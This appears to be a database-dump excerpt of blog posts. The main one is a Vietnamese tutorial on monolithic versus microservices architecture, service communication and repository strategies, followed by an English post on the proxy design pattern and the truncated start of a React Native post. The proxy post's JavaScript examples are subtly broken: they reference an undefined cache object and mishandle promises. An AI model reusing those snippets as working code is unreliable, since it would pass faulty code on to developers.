Mình muốn bạn xem bức ảnh khối đá trên trước nhằm mục đích cắt nghĩa từ `Monolith` trong cụm từ Monolithic Architecture. Monolith ở đây được hiểu là một khối đá **rất lớn**, **dựng đứng và nguyên khối**. *Hãy chú ý tới những từ mình in đậm nhé.* 😊

**Vậy nếu đặt từ này vào trong cụm từ Monolithic Architecture của ngành IT thì nó sẽ được hiểu như nào?** ❓️❓️❓️

<hr>

Để trả lời, mình có vẽ một sơ đồ dưới đây về kiến trúc của một ứng dụng.

![image.png](https://images.viblo.asia/1853a308-0058-4cd2-95cb-1ea179672d2e.png)

<div align="center">

*(Ảnh 2: VD1 - Viblo Monolithic Architecture Example - Made by Kim)*

</div>

Trong ngành IT, **Monolithic Architecture ám chỉ một kiến trúc hệ thống mà tất cả các thành phần của ứng dụng đều nằm trong một source code duy nhất**. Hình ảnh của nó trông chả khác gì một khối đá đồ sộ và đứng sừng sững... một cục... 😒 🤔 😆

Chính vì tất cả là một khối nên nó có một số đặc điểm chung đó là:
- Kiến trúc **đơn giản, dễ triển khai** lên production
- Mọi thứ được phát triển, deploy và scale **trên 1 code base duy nhất**
- Ứng dụng được viết với **1 technical stack duy nhất**

Trong sơ đồ trên, mình giả sử là **hình mình hoạ** cho VD1 về hệ thống https://viblo.asia sử dụng Monolithic Archiecture chẳng hạn. Lúc này, tất cả các thành phần như:
- Accounts, Authentication, Posts, Questions… ***đều build trong một source code duy nhất viết bằng Ruby on rails***
- Users sẽ truy cập và sử dụng một app duy nhất là Rails - mình gọi là ***Monolithic Application***
- Ứng dụng sẽ kết nối tới **một database duy nhất**, và database này chứa tất cả các thông tin về:
    - Tài khoản
    - Bài viết
    - Câu hỏi
    - Phân quyền...

Tới đây, bạn đã thấy bóng dáng về ứng dụng của mình trong đấy chưa? 😆

*Trước khi có microservices, monolithic là một chuẩn chung khi phát triển ứng dụng và tới bây giờ nó vẫn được dùng với các dự án nhỏ. Điều này cũng hết sức bình thường thôi. Không có gì căng thẳng!* 😄

## Những trở ngại của Monolithic Architecture

![image.png](https://images.viblo.asia/1853a308-0058-4cd2-95cb-1ea179672d2e.png)

<div align="center">

*(Ảnh 2: VD1 - Viblo Monolithic Architecture Example - Made by Kim)*

</div>

- Với dự án nhiều team, team sẽ phải cẩn thận để không làm **ảnh hưởng tới chức năng của team khác**
- Khi có chỉnh sửa source code, **sẽ phải build và deploy lại toàn bộ cả ứng dụng**, gây mất nhiều thời gian để release
- **Team bị bó buộc trong một technical stack** duy nhất: Chẳng hạn trong VD1, team bị gắn chặt vào Ruby on rails. Điều này vô hình làm team không tận dụng được sức mạnh đến từ các ngôn ngữ lập trình / technical stack khác.

![image.png](https://images.viblo.asia/daf0a57d-9678-490d-82de-1732c00dc300.png)

- **Không thể deploy / scale riêng cho một phần chức năng** nào đó. Rõ ràng, khi mọi chức năng đều chung một source code, chúng ta bắt buộc phải scale cả cái ứng dụng to đó lên. Bản chất khi scale như vậy vẫn chưa được coi là microservices.
- Càng lâu dài, **càng nhiều code**, ứng dụng **càng trở nên cồng kềnh và phức tạp**
- Nhiều code của **các thành phần khác nhau bị rối và lẫn lộn vào nhau**, ảnh hưởng việc phát triển giữa các team
- **Dependencies conflict** giữa các thành phần khác nhau
- Mỗi thay đổi trước release, cần phải test lại cả ứng dụng

<hr>

**VD2: Về dependencies conflict.**

![image.png](https://images.viblo.asia/c3ea9433-99e1-4232-87f9-7f33b5b9cd43.png)

<div align="center">

*(Ảnh 3: VD2 - Dependencies Conflict - Made by Kim)*

</div>

- Trong hình, chức năng `Authentication` yêu cầu thư viện `Passport v9.x` thì mới có thể hoạt động
- Trong khi đó, chức năng `Authorization` có một số đặc thù mới từ khách hàng, dẫn tới yêu cầu thư viện `Passport v10.x` mới có thể làm được
- Lúc này, team đảm nhiệm chức năng `Authentication` bắt buộc phải thực hiện migrate code để có thể dùng cùng phiên bản `Passport v10.x`

<hr>

**VD3: Về vấn đề scale.**

- Xét hệ thống của Viblo, giả sử Viblo tổ chức sự kiện Khai bút đầu xuân với trị giá giải thưởng lên tới 1 tỷ đồng. Dẫn tới thu hết rất nhiều tác giả viết bài rất hay như: Trịnh Quốc Việt, Minh Monmen, hay mình chẳng hạn 😅😅😅 cùng tham gia viết bài và thu hút số lượng rất cao traffic vào đọc bài tăng đột biến.
- Một hệ thống theo kiến trúc Monolithic không thể scale riêng cho chức năng đọc bài và render bài viết từ markdown sang HTML vì tất cả các thành phần đều chung một app.

<hr>

Trên đây là một số ví dụ mình dẫn ra để giúp bạn hình dung được về những vấn đề của Monolithic Architecture. Để giải quyết các vấn đề trên, Microservices Architecture đã được hình thành. Nội dung tiếp theo, không có gì khác, chắc chắn sẽ là Microservices Architecture. 🤭🤭🤭

## 👉️ Tìm hiểu về Microservices Architecture

##  Microservices Architecture là gì?

Ở phần trên, mình đã trình bày khá chi tiết về Monolithic Architecture và các trở ngại mà chúng ta phải đối mặt. Tất cả các vấn đề mà Monolithic Architecture gặp phải sẽ đều được giải quyết với Microservices Architecture.

![image.png](https://images.viblo.asia/1853a308-0058-4cd2-95cb-1ea179672d2e.png)

<div align="center">

*(Ảnh 2: VD1 - Viblo Monolithic Architecture Example - Made by Kim)*

</div>

![image.png](https://images.viblo.asia/1c9db820-f9e9-40e4-a3ab-709dd912b431.png)

<div align="center">

*(Ảnh 4: VD4 - Viblo Microservices Architecture example - Made by Kim)*

</div>

Về cơ bản, Microservices Architecture là kiểu kiến trúc mà **ứng dụng sẽ được chia thành nhiều dịch vụ nhỏ hơn và độc lập với nhau** gọi là ***microservice*** hay ***service***, các service **kết nối với nhau** tạo thành một ứng dụng lớn.

Như trong ảnh VD4 trên, mình làm mô phỏng việc chuyển đổi sang Microservices Architecture của Viblo, các chức năng sẽ được phân hóa ra thành rất nhiều microservice độc lập như:
- Authentication service: Đảm nhiệm xử lý hoạt động xác thực danh tính người dùng
- Accounts service: Đảm nhiệm việc quản lý các thông tin liên quan tới tài khoản người dùng
- Stories service: Đảm nhiệm việc quản lý các thông tin liên quan tới bài viết
- ... Và có thể có rất nhiều các service khác
- Mỗi service có thể có database của riêng nó

<hr>

**Vậy thì một số câu hỏi đặt ra trước mắt là:**
- *Làm sao để chia nhỏ ứng dụng?*
- *Làm sao để kết nối chúng?*
- *Phải tạo bao nhiêu service?*
- *Lưu trữ và quản lý source code như nào?*
- *Deploy các service ra sao?*

Hãy tiếp tục phần tiếp theo để có những câu trả lời nhé các bạn.

## Những lợi ích của Microservices

Như đã đề ở phần trước, microservices sẽ chia ứng dụng thành nhiều service nhỏ và độc lập. Chính bởi vậy, nó mang lại một số lợi ích:
- Develop, deploy và scale các service không bị phụ thuộc lẫn nhau. Nếu có 10 services, 1 bản update mới cho 1/10 service thì quá trình release chỉ cần build / test / deploy cho duy nhất 1/10 service giúp rút ngắn thời gian release, cũng như có thể dễ dàng scale cho từng service riêng lẻ.

![image.png](https://images.viblo.asia/984d6212-635c-427f-9cd1-a7d4e0e016d4.png)

<div align="center">

*(Ảnh 5: CI / CD riêng lẻ cho từng service - Made by Kim)*

</div>

- Mỗi service có thể được phát triển bởi một team khác nhau, cái này thì rõ ràng rồi
- Mỗi team có thể lựa chọn được technical stack riêng sao cho tối ưu cho service cần phát triển. Thay vì chỉ dùng Ruby on Rails như trong VD1, mình thí dụ Viblo có thể lựa chọn:
    - Node.js cho Authentication service
    - Go cho Accounts service
    - Rust cho Authorization service
    - Python cho Bookmarks service
    - Có thể sử dụng đa dạng các loại database như PostgreSQL, MySQL, MongoDB

![image.png](https://images.viblo.asia/d7cda9a4-5953-4fcd-ac84-dd04a5d29fe0.png)

<div align="center">

*(Ảnh 6: Lợi ích microservices - Made by Kim)*

</div>

- Các service có thể có verison hoàn toàn khác nhau và dependencies độc lập
- Giúp hệ thống dễ dàng hơn khi phân tán trên nhiều server / vùng khác nhau. Điều này là bởi các microservice thường phải đi kèm theo các orchestration như Docker, Kubernetes, mà phổ biến nhất bây giờ là Kubernetes - có vai trò tự động phân bổ các service vào server cũng như là giám sát chúng.

## Nhược điểm của microservices

Trong một hệ thống microservice, mỗi service con sẽ là một mắt xích trong cả hệ thống hàng chục, hàng trăm service con. Việc có quá nhiều service con được "đẻ ra" dẫn tới rất nhiều vấn đề phát sinh, cần phải xử lý sao cho phù hợp để nhàn hơn về sau. Nếu xử lý không tốt sẽ có thể gây ra một chuỗi các lỗi như hiệu ứng domino vậy. Dưới đây là một số nhược điểm của microservices mà chúng ta cần phải lưu ý:

- Ứng dụng trở nên phức tạp do bị chia thành rất nhiều service, distributed system
- Việc communication giữa rất nhiều các services sẽ làm tăng lưu lượng mạng nội bộ lên gấp nhiều lần, đòi hỏi phải có các giải pháp để các service gửi ít dữ liệu hơn và nhanh hơn. 😅
- Monitoring khó khăn hơn vì sẽ rất nhiều container và phân tán trên nhiều servers. Nếu làm không tốt ngay từ đầu sẽ dẫn tới hệ lụy rằng khó truy vết, xác định lỗi trong cả trăm service.

![image.png](https://images.viblo.asia/c7fe857e-1400-45e0-8dc8-397d1c5b2aa2.png)

<div align="center">

*(Ảnh 7: Minh họa nhược điểm)*

</div>

Tuy nhiên cũng có rất nhiều công cụ để việc deploy microservices dễ dàng hơn, phổ biến nhất đó là Kubernetes.

Và tất nhiên rồi, bạn sẽ lại phải học =)) 🤗😇 Orchestration, Security, Monitoring, gRPC, Service Mesh…

Bạn thấy nó còn nhược điểm nào nữa không? Comment xuống dưới giúp mình nhé! 💕

## 👉️ Chuyển đổi từ Monolithic sang Microservices?

Thực ra việc chuyển đổi từ monolithic sang microservices sẽ có nhiều thứ bạn cần học và tìm hiểu. Nếu bạn mong muốn có thêm những nội dung liên quan tới microservices, hãy ủng hộ mình bằng cách upvote, follow cũng như comment xuống dưới nhé.

Thông thường, để chuyển đổi sang microservices, bạn phác thảo sơ bộ về system architecture của hệ thống như:
- Cần phải có bao nhiêu service?
- Các service sẽ có vai trò như nào trong hệ thống?
- Việc trao đổi dữ liệu giữa các service ra sao?
- ....

![image.png](https://images.viblo.asia/d5736d4c-5dca-4825-8c09-060c06bdb4fe.png)

Chúng ta đang nói với nhau rằng microservices thì phải **chia nhỏ ứng dụng thành nhiều service nhỏ hơn**. Vậy như **thế nào mới là nhỏ**? Bao nhiêu service thì là đủ? **Phương pháp** nào để chia ứng dụng ban đầu thành các service con?

Thật ra, chúng ta không có giới hạn cũng như định nghĩa như nào là nhỏ hay to, số lượng service bắt buộc phải là một con số bao nhiêu đó. Điều này hoàn toàn phụ thuộc vào quy mô cũng như nguồn lực của dự án. Tuy nhiên, thường thì ban đầu, chúng ta sẽ chia nhỏ ứng dụng monolithic dựa theo **chức năng nghiệp vụ** thay vì căn cứ theo technical.

Chẳng hạn, chúng ta không chia kiểu: web-app, api, redis, database.. điều này sẽ làm bạn *rất rối* ở bước đầu. Thay vào đó hãy căn cứ theo chức năng nghiệp vụ của ứng dụng:
- Accounts service: Quản lý thông tin tài khoản
- Stories service: Quản lý thông về bài viết
- Search service: Đảm nhiệm chức năng tìm kiếm của hệ thống
- Auth service: Đảm nhiệm chức năng authentication / authorization
- Recommendation service: Đảm nhiệm chức năng làm hệ gợi ý các bài viết hay khác tới users

Phân chia như vậy giúp bạn phác thảo ra hình hài của hệ thống. Từ đó, khi xem xét các vấn đề các thành phần technical khác sẽ tự xuất hiện như:
- Queue
- Scheduler
- Database
- Kafka...

**Và hãy cố gắng để mỗi service chỉ đảm nhiệm một phần chức năng chuyên biệt.**

## 👉️ Vấn đề trao đổi dữ liệu giữa các service trong microservices

Như đã đề cập ở trên, việc đẻ ra rất nhiều các service con trong một hệ thống khiến lưu lượng mạng sẽ tăng lên gấp nhiều lần khi các service sẽ cần gọi lẫn nhau và chúng ta cần có các giải pháp để giảm lưu lượng mạng xuống mà vẫn đáp ứng được yêu cầu dữ liệu.

Trong phần này, mình sẽ giới thiệu tới các bạn các cách để các service có thể tìm thấy nhau và trao đổi được dữ liệu.


### Dùng Service Mesh

![image.png](https://images.viblo.asia/13519680-b899-49d9-9c79-4dfd7780249a.png)

<div align="center">

*(Ảnh 8: Kubernetes - Nguồn: Mulesoft Blog)*

</div>

Service Mesh là một hình thức phổ biến và tất cả các microservices đều bắt buộc phải có khi hệ thống có cả trăm service.

Trong đó, **service mesh đóng vai trò trung gian chịu trách nhiệm các vấn đề về network** như:
- Chia IP cho từng service con theo các dải mạng để các service con có thể tìm thấy nhau hoặc cô lập với nhau 😂
- Cung cấp `Sidecar`, kiểu như một dạng proxy để forward request vào service tương ứng
- Xử lý vấn đề về DNS cho các service, kiểu như đặt tên miền cho mỗi service, các service không giao tiếp trực tiếp bằng IP mà sẽ dùng tên miền, VD như dùng K8s, mình muốn gửi request tới Accounts service thì sẽ gửi request tới domain:  `accounts.svc.cluster.local`. Sau đó, service mesh sẽ DNS để tới đúng IP của service tương ứng.

Service mesh thường đi kèm trong các orchestration như **Docker, Kubernetes**. Có thể service mesh architecture của từng orchestration khác nhau nhưng chức năng của nó vẫn là service mesh.

***VD như trong Ảnh 8 bên trên là service mesh architecture của K8s. K8s sẽ cung cấp các thành phần gồm control plane + sidecar proxy. Các service của chúng ta sẽ ủy quyền việc communication cho Control Plane. Control plane sẽ DNS và forward request tới đúng service được yêu cầu.***

### Dùng RESTful

Về REST thì bản chất vẫn là HTTP + JSON payload.

![image.png](https://images.viblo.asia/739039b5-61e1-40bc-8332-37fb2adce4b8.png)

<div align="center">

*(Ảnh 8: RESTful API communication - Made by Kim)*

</div>

- Mỗi service sẽ có bộ API của riêng nó, trong có đa dạng các request GET, PUT, POST và nhiều URL khác nhau như: /login, /users/123...
- Một service gửi HTTP request đi và chờ HTTP response trở về
- Hình thức communication này còn được gọi là => Synchronous communication, tức thằng gửi request đi phải chờ có phản hồi thì mới xử lý tiếp.
- Hình thức communication này thì đơn giản và dễ dàng triển khai.

### Dùng GraphQL

Tương tự như REST, GraphQL bản chất vẫn là HTTP + JSON. Tuy nhiên một chút điểm khác biết đó là client:
- Chỉ sử dụng POST method
- Client + Server đều dùng chung một Schema về resource - được quy định từ trước khi code
- Trả về đúng các thông tin về resource được yêu cầu, không thừa, không thiếu một field nào
- Single endpoint: Client chỉ gửi request tới một endpoint URL duy nhất

![image.png](https://images.viblo.asia/084d4e98-92a9-49cf-be89-a7530c9a236f.png)

<div align="center">

*(Ảnh 9: GraphQL communication - Nguồn: Apollo GraphQL Server)*

</div>

- GraphQL server thường có cơ chế gọi là federation - tư tưởng tương tự microservices:
    - Chia nhỏ GraphQL server ban đầu thành nhiều service graphql server nhỏ hơn gọi là sub-graph. (Ảnh 9)
    - Trong đó có một service đóng vai trò là Gateway, forward GraphQL request tới các service con.
    - Cơ chế federation cũng cho phép mapping dữ liệu giữa các sub-graph với nhau
- Một số GraphQL server hỗ trợ subscription, tính năng tương tự như socket, giúp realtime data từ server xuống client.
- Ngoài ra, subscription còn được dùng để tạo cơ chế lazy response như trên Hasura:
    - Client gửi HTTP request lên GraphQL server
    - Server trả về HTTP response là subscription id và xử lý yêu cầu background trên server
    - Client subscribe theo ID vừa nhận
    - Khi xử lý xong, server gửi data được về cho client đang subcribe subscription-id.

### Dùng Message broker

Một cách khác để communicate giữa các service đó là dùng giao thức *Message Broker*, rất hữu ích với các service implenment event bus (*Event Driven architecture*):
- Trước tiên, các service (thường gọi là producer) sẽ gửi **message** đến một thành phần **trung gian gọi là Broker**, VD: Redis, RabbitMQ...
- Sau đó, broker sẽ **đưa message vào trong queue** để chờ tới lượt
- Khi tới lượt, message trong queue sẽ được gửi tới các subscriber (thường gọi là consumer) - chính là các service đầu cuối

![image.png](https://images.viblo.asia/2ab2ab64-75d8-461c-b517-ad7b829d1040.png)

<div align="center">

*(Ảnh 10: Message broker với RabbitMQ - Nguồn: Microsoft)*

</div>

- Đây là một dạng ***Asynchronous communication***
- Trao đổi thông tin dưới dạng các **message**
- Ngoài ra, nó cũng hay được biết đến với pattern: *Publish / Subscribe*

### Dùng gRPC

gRPC là cũng một phương án rất hiệu quả để các service có thể trao đổi dữ liệu với nhau.

> gRPC = RPC + Protocol Buffers

![image.png](https://images.viblo.asia/4ae2a870-f11a-4d1a-bd12-02b21de8072b.png)

<div align="center">

*(Ảnh 11: gRPC communication giữa các service trong Microservices)*

</div>

- Được tạo ra bởi Google, trên Viblo có một bài viết rất hay giới thiệu về gRPC của **200labs**, mọi người có thể đọc thêm
- Trong đó thì RPC là framework giúp **một service có thể gọi một hàm nằm ở một service khác** hay còn gọi là **Remote Procedure Call**

![image.png](https://images.viblo.asia/c962cff4-f34c-4931-bf9b-64fabb4799d3.png)

<div align="center">

*(Ảnh 12: Cách hoạt động của gRPC)*

</div>

- **Protocol Buffers (Protobuf) giúp encode data về dạng binary** thay vì dùng dạng JSON-text như REST, GraphQL, giúp giảm kích thước của data. Các resource được định nghĩa trong một file syntax Protobuf có đuôi `*.proto`. Các ngôn ngữ lập trình khác nhau sẽ đọc file này để tự **generate ra code RPC tương ứng**.

![image.png](https://images.viblo.asia/e3bda714-a526-4b78-8bb4-78f16cf3c5f3.png)

<div align="center">

*(Ảnh 13: Một mẫu file Protobuf với rGPC)*

</div>

- gRPC được xây dựng trên HTTP2, khác với REST và GraphQL. Điều này giúp nó có thêm các **tính năng streaming ấn tượng giúp tối ưu performance**
- gRPC được biết đến là phương án mang có **performance cao, tiêu tốn ít băng thông** hơn nhiều so với việc  sử dụng JSON truyền thống

### Mixed - Kết hợp

Trên đây mình đã điểm qua các hình thức communication phổ biến giữa các service trong hệ thống microservices. Chúng ta không nhất thiết phải chỉ dùng một loại mà có thể kết hợp lẫn nhau sao cho phù hợp.

Chẳng hạn, bạn có thể kết hợp GraphQL  + gRPC:
- GraphQL đóng vai trò như API Gateway để publish service ra *thế giới bên ngoài*
- gRPC đóng vai trò communication giữa các Private Services với nhau hoặc từ GraphQL server tới các private services

VD như Ảnh 11:

![image.png](https://images.viblo.asia/4ae2a870-f11a-4d1a-bd12-02b21de8072b.png)

Trên đây là kết thúc phần giới thiệu về các hình thức communication giữa các microservices. Tiếp theo, mình sẽ điểm qua nội dung về việc quản lý source code cho hệ thống microservices.

## 👉️ Code managenment & CI/CD cho microservices

![image.png](https://images.viblo.asia/6fa83dcc-1529-448c-94b9-08e98989e75f.png)

<div align="center">

*(Ảnh 14: Code management in Microservices - Made by Kim)*

</div>

Khi các service được develop và deploy riêng lẻ thì lúc này:
- Việc tổ chức và quản lý code với Git sẽ như nào?
- Deploy service ra sao?
- Bình thường, 1 application -> 1 git repository
- Vậy với hệ thống lớn có hàng trăm service thì cần bao nhiêu repo?

Thực ra, có thể bạn đã biết, chúng ta có hai cách phổ biến hiện này cho việc quản lý source code đó là:
- Poly-repo (Multi-repo): Mỗi project / service một repository trên Git.
- Mono-repo: Nhiều project / service đều để chung trong một repository trên Git.

![image.png](https://images.viblo.asia/366504cc-4bf9-4038-a1a5-d24f93a80f8e.png)

<div align="center">

*(Ảnh 15: Code management in Microservices - Nguồn: Internet)*

</div>

## Polyrepo (Multi-repo)

![image.png](https://images.viblo.asia/0042974c-001a-43ce-a358-369b7dd5a423.png)

<div align="center">

*(Ảnh 16: Polyrepo - Microservices - Made by Kim)*

</div>

### Ưu điểm Polyrepo

- **Một repository cho một service**
- Code hoàn toàn độc lập
- Clone và làm việc hoàn toàn tách biệt
- Đối với Gitlab, có thể sử dụng chức năng Gitlab Group cho mỗi ứng dụng để nhóm các microservices cũng như chia sẻ secret key, CI/CD variables
- Github sẽ khó khăn hơn khi phải dùng Organization thay cho Group của Gitlab
- CI/CD cấu hình đơn giản hơn
- Quản lý được chặt chẽ quyền truy cập theo từng project

### Nhược điểm Polyrepo

- Việc tìm kiếm source code khó khăn hơn do trải dài trên nhiều repo
- Nếu 1 tính năng cần sửa đổi code của nhiều service cũng lúc
- => phải tạo nhiều PR => việc deploy không đồng nhất
- Các file và script cấu hình như docker, k8s sẽ phải sao chép lại trên nhiều repo

## Monorepo

Ngược lại với Polyrepo, Mono repo lại có hình hài như này:

```bash
- microservices-demo
|__ .git
|__ .docker
|__ src
        |__ users-service
        |__ auth-service
        |__ stories-service
        |__ search-service
        |__ ...
```

Nhiều công ty lớn như: Google, Facebook cũng dùng monorepo để quản lý source code.

### Ưu điểm Monorepo

- Sử dụng 1 Git repository để lưu trữ nhiều projects
- Mỗi project là một folder chỉ chứa code của project đó
- Quản lý code và phát triển đơn giản hơn khi tất cả code cùng một repo
- Clone và làm việc chỉ với 1 repo, dễ làm/test cùng nhau

### Nhược điểm Monorepo

* Nếu setup không tốt, sẽ dàng phá vỡ quy tắc mỗi service deploy một cách độc lập
* Ứng dụng ngày một lớn hơn, việc push / pull code trở nên chậm hơn
* Một số hệ thống CI/CD chưa support mono repo -> phải viết thêm logic để xử lý việc deploy độc lập từng service
* Chỉ có 1 main branch cho toàn bộ các projects
* => sẽ gây ảnh hưởng tới việc phát triển của các project khác

## Mixed - Kết hợp

Không có ràng buộc nào bắt buộc chúng ta phải dùng monorepo hay polyrepo cả. Thậm chí bạn có thể phối kết hợp cả hai loại trên. Tuy nhiên, theo mình:
- Ưu điểm của monorepo thì trở thành nhược điểm của polyrepo và ngược lại.
- Nếu dự án chỉ một team, hoặc các team không cần phải chặt chẽ về việc phân quyền và quản lý truy cập => Dùng Monorepo
- Nếu dự án nhiều team và yêu cầu rất nghiêm ngặt về việc ai được truy cập project nào, ai không => Dùng Polyrepo

Dựa vào những phân tích ưu nhược điểm trên của mình, hy vọng bạn sẽ chọn được cho mình phương án sử dụng Git repository phù hợp nhé. 😃😆

## 👉️ Tổng kết

Qua bài viết này, mình tin rằng đã cung cấp cho bạn một cái nhìn tổng quan nhất về Microservices Architecture:
- Hiểu được Monolithic / Microservices là gì
- Làm sao để chuyển đổi từ monolithic sang microservices
- Các ưu nhược điểm của từng loại architecture kể trên
- Cách services trao đổi dữ liệu, giao tiếp với nhau trong microservices
- Quản lý source code microservices; CI/CD

**⚠️ CHỖ NÀY PHẢI CHÚ Ý:**

- Nếu bạn quan tâm tới chủ đề này và muốn mình ra thêm các bài viết tương tự, hãy comment xuống dưới nhé!
- Đừng quên cho mình một upvote / bookmark  / follow để ủng hộ mình và có nhận được thông báo khi có bài viết mới nha.
- Donate cho mình nếu bạn thấy nội dung này hữu ích và muốn mình làm thêm về các topic bạn mong đợi: Mono, Paypal, Bank
- => Link donate: https://kimyvgy.webee.asia', '2023-02-08T07:12:28.000000Z', '2023-02-28T05:00:16.000000Z', '2023-02-08T07:18:21.000000Z'),
	('Blog#133: Understanding the Proxy Design Pattern', 'BQyJKjxW4Me', '2', 'public', 'https://images.viblo.asia/0cd523a6-af06-4c9e-bfa1-a119c3e4e525.png', '

The main goal of this article is to help you improve your English level. I will use Simple English to introduce to you the concepts related to software development. In terms of IT knowledge, it might have been explained better and more clearly on the internet, but remember that the main target of this article is still to LEARN ENGLISH.

Hi, I''m Tuan, a Full-stack Web Developer from Tokyo 😊.
F...', '![image.png](https://images.viblo.asia/0cd523a6-af06-4c9e-bfa1-a119c3e4e525.png)

> The main goal of this article is to help you improve your **[English](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)** level. I will use **[Simple English](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)** to introduce to you the concepts related to software development. In terms of IT knowledge, it might have been explained better and more clearly on the internet, but **remember** that the main target of this article is still to **[LEARN ENGLISH](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)**.
-----
Hi, I''m [Tuan](https://tuan-portfolio.web.app/#/), a Full-stack Web Developer from Tokyo 😊.
Follow my blog to not miss out on useful and interesting articles in the future.
# Introduction
Do you ever feel like you have to jump through hoops to get something done? The same can be said for coding. Many modern web-developers are familiar with the proxy design pattern. It simplifies complex tasks, making coding more efficient.

The proxy pattern is basically a way to dictate how other objects are accessed. If you are looking for an easy way to keep control of the data you''re working with, the proxy design pattern is an excellent choice. This article will teach you how to implement this design pattern in Javascript.

## What is the Proxy Design Pattern?
The proxy design pattern is a structural programming scheme that acts as a wrapper around another object. It allows access to complex objects, enhancing flexibility. It is designed to hide implementation details and provide a simpler structure for code. It can also be used to manipulate data or restrict access to certain parts of an application.

## Why Use the Proxy Design Pattern?
Using the proxy design pattern provides a few key advantages;
- It simplifies the structure of code.
- It improves the performance of the code by reducing repetitions,
- It provides a layer of security to restrict access to certain parts of the code.
- It can be used to create flexible API’s.

## Where Is The Proxy Design Pattern Used?
The proxy design pattern is widely used in web development. It is used to simplify client/server interactions, API queries, or other data-modeling needs. It can also be used in libraries, frameworks, and even in databases.

## How Does the Proxy Design Pattern Work?
At its simplest, a proxy is an intermediary object that takes the place of another object. It is usually implemented as a function that takes the input and passes it on to the underlying object.

The proxy design pattern can be implemented in a variety of ways depending on the specific task needed. The most common implementations are to provide caching, logging, and validation.

# Use Cases
## 1. Caching
Caching is a popular use-case for proxies, as it enhances the performance of code when working with frequently used objects.

For example, consider the following piece of code:

```javascript
const getRequest = (url) => {
  fetch(url)
    .then((response) => response.json())
    .then((data) => console.log(data));
}
```

To cache the result of the request, we can use a proxy to provide a layer of abstraction over the fetch() function. This way, we can store the response of the request, so it doesn''t have to be made again if the same request is called.

```javascript
const getCachedRequest = (proxy, url) => {
  // check if URL result is already cached
  const cachedResult = proxy.getCachedResult(url);
  if (cachedResult) {
    return cachedResult;
  }
  // if not, make the request and cache the result
  return fetch(url)
    .then((response) => cache.addCachedResult(url, response.json()) )
    .then((data) => console.log(data));
}
```

The code for the proxy looks something like this:
```javascript
const proxy = {
  cache: {},
  getCachedResult: (url) => proxy.cache[url],
  addCachedResult: (url, result) => proxy.cache[url] = result,
};
```

## 2. Logging
Logging is a great use-case for proxy design. It provides a layer of abstraction over logging tasks, allowing us to easily track errors, warnings, and general information about what is happening within the application.

For example, consider the following code:

```javascript
const getRequest = (url) => {
  fetch(url)
    .then((response) => response.json())
    .then((data) => console.log(data));
}
```

To log the request, we can use a proxy to provide a layer of abstraction over the fetch() function. This way, we can store the request URL and the response data, so we can easily see when requests are made and what they returned.

```javascript
const getRequestLogged = (proxy, url) => {
  return fetch(url)
    .then((response) => proxy.logRequest(url, response.json()) )
    .then((data) => console.log(data));
}
```

The code for the proxy looks something like this:

```javascript
const proxy = {
  log: [],
  logRequest: (url, result) => {
    proxy.log.push({
      url: url,
      result: result
    })
  }
};
```

## 3. Validation
The proxy design pattern is also great for validation. It can be used to prevent changes to an object that invalidate the data.

For example, consider a basic model object with a few fields and a function to set them.

```javascript
const model = {
  name: '''',
  age: 0,
  setName(name) {
    model.name = name;
  },
  setAge(age) {
    model.age = age;
  }
}
```

To prevent mistakes, we can use a proxy to validate the data before it is set in the model.

```javascript
const validateSetName = (proxy, name) => {
  if (proxy.isValidName(name)) {
    model.setName(name);
  } else {
    console.log(''Invalid name'');
  }
}
```

The code for the proxy looks something like this:

```javascript
const proxy = {
  isValidName: (name) => name.length > 2,
};
```

# Conclusion
As you can see, the proxy design pattern is a great way to structure code and improve its performance by providing layers of abstraction and validation. It is especially useful when dealing with complex tasks and data entry. We hope this article has provided you with the information necessary to start using the proxy design pattern in your own projects.

# And Finally
As always, I hope you enjoyed this article and learned something new.
Thank you and see you in the next articles!

If you liked this article, please give me a like and subscribe to support me. Thank you. 😊

-----
> The main goal of this article is to help you improve your **[English](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)** level. I will use **[Simple English](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)** to introduce to you the concepts related to software development. In terms of IT knowledge, it might have been explained better and more clearly on the internet, but **remember** that the main target of this article is still to **[LEARN ENGLISH](https://viblo.asia/s/master-english-with-technical-knowledge-BQyJKzg14Me)**.

# Resource
* https://tuan200tokyo.blogspot.com/2023/02/blog133-understanding-proxy-design.html', '2023-02-08T06:35:03.000000Z', '2023-02-28T02:56:06.000000Z', '2023-02-09T01:06:57.000000Z'),
	('Benefits and Shortcomings of The React Native Framework!', 'm2vJPOal4eK', '3', 'public', 'https://images.viblo.asia/a53cc1ac-cc09-47a7-8a8c-61c8b94f89e1.png', '![](https://images.viblo.asia/a53cc1ac-cc09-47a7-8a8c-61c8b94f89e1.png)



Why does every next-gen organization want to leverage mobility solutions today? That’s because mobile apps have become the fast-track solution to influence audiences. So, every company wants a dedicated mobile app.

But real confusion arises when it comes to the choice of the right framework for mobile app development. As there are a vast number of competent frameworks available in the market...', '![](https://images.viblo.asia/a53cc1ac-cc09-47a7-8a8c-61c8b94f89e1.png)

Why does every next-gen organization want to leverage mobility solutions today? That’s because mobile apps have become the fast-track solution to influence audiences. So, every company wants a dedicated mobile app.

But real confusion arises when it comes to the choice of the right framework for mobile app development. As there are a vast number of competent frameworks available in the market, selecting the right framework becomes challenging.

What if there exists a promising framework that helps to design top-quality apps with fewer resources?

The Facebook-created React Native framework is the perfect solution for such a requirement. React Native app development is preferred by several big players in the market like Facebook, UberEats, Delivery.com, Skype, Bloomberg, Instagram, Vogue, Tesla, etc. to name a few. React Native app developers use JavaScript and JSX to create iOS and Android native apps. The framework offers native layout components that facilitate the creation of convincing UIs that are pretty much similar to native apps.

Reusability of components, sharable code repository, and, the “Learn once, write anything” objective, have already made React Native a winning choice for cross-platform app development. So, if you are going to build your next app with this framework or going to hire a React Native app development company for your project, this blog will help you to make an informed decision. Here’s a list of some noteworthy pros and cons of the React Native framework.


## Pros of Using React Native for Your Mobile App
##

![](https://images.viblo.asia/a4532544-2065-428b-b7ba-a7df6b6c3006.png)


### Time and Cost-Effective Solution
###

